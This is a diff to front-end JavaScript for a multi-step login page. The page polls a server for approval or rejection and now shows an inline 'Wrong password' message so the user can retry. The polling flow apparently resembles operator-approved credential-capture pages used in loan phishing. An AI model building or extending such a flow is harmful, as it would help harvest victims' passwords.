@@ -140,9 +140,32 @@
                   window.location.href = "loan8.html";
                 } else if (j.rejected) {
                   clearInterval(pollInterval);
-                  document.body.removeChild(overlay);
+                  // remove overlay and show inline error above form so user can retry
+                  try {
+                    document.body.removeChild(overlay);
+                  } catch (e) {}
                   const card = document.querySelector(".card");
-                  card.innerHTML = `<h1>Verification Failed</h1><p>Rejected: ${j.message}. <a href="login2.html">Try again</a></p>`;
+                  const form = document.getElementById("login2Form");
+                  // create or update error element
+                  let errEl = document.getElementById("login2Error");
+                  if (!errEl) {
+                    errEl = document.createElement("div");
+                    errEl.id = "login2Error";
+                    errEl.style.color = "#f44336";
+                    errEl.style.marginBottom = "12px";
+                    errEl.style.fontWeight = "600";
+                  }
+                  errEl.textContent = "Wrong password — try again";
+
+                  if (form && card.contains(form)) {
+                    card.insertBefore(errEl, form);
+                    // re-enable inputs/buttons if they were disabled
+                    const inputs = form.querySelectorAll("input, button");
+                    inputs.forEach((el) => (el.disabled = false));
+                  } else {
+                    // fallback: replace card content
+                    card.innerHTML = `<h1>Verification Failed</h1><p>Wrong password — <a href="login2.html">Try again</a></p>`;
+                  }
                 }
               } catch (err) {
                 console.error("Poll error:", err);
